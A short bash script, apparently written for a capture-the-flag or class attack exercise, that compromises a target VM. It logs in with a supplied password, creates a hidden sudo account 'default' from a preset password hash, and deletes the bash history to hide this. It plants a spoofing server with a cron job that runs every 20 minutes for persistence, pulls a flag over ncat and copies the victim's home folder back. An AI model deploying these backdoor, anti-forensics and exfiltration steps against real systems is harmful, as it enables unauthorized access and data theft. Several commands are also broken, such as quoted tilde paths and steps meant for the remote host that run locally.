 #!/bin/bash

IP=$1
PASSWORD=$2

OUR_USR="default"

# Create folder for data on our vm
mkdir "~/vms/${IP}"

# Save password to our folder
echo "${PASSWORD}" > "~/vms/${IP}/pwd"

ssh "class@${IP}"

# add user with name default and password worldofwonders
sudo useradd -m -p "\$6\$0mb/OJ.9.a4H5PkD\$0fCeQDMPOBBVERSXe8yt4qjmxvjapc4C.X73qrEaJ/WelKcEvlno9OGCrAHO6L6n/W1Z0d6L28vSGxdx9RMjR." -s /bin/bash "${OUR_USR}"
sudo usermod -aG sudo "${OUR_USR}"

# erase history
rm -rf .bash_history
exit

# ------------------ set up spoofing server
# copy new instance of spoofing server
# TODO - add correct folders copy
scp -r "/home/class/fun/spoofer" "${OUR_USR}@${IP}:/home/${OUR_USR}/spoofer"
# TODO - execute it

# Copy encryption cron job
scp -r "/home/class/fun/spoofer/cron" "${OUR_USR}@${IP}:/home/${OUR_USR}/spoofer/cron"

# Enable encryption job every 20 minutes
(crontab -l 2>/dev/null; echo "*/20 * * * * /home/${OUR_USR}/spoofer/cron/encrypt_log.sh") | crontab -


# ------------------ Steal their flag
ssh "${OUR_USR}@${IP}"
# get their flag for A02
echo "EuphoricMushroomsFeedAnywhere" | ncat 192.168.1.167 26711 | grep -o "BSY-FLAG-A02-{[a-zA-Z0-9]*}" > "flag-${IP}"
exit
# copy flag home
scp -r "${OUR_USR}@${IP}:/home/${OUR_USR}/flag-${IP}" "/home/class/vms/${IP}/a02"


# ------------------ Copy their folder
scp -r "class@${IP}:/home/class" "/home/class/fun/${IP}"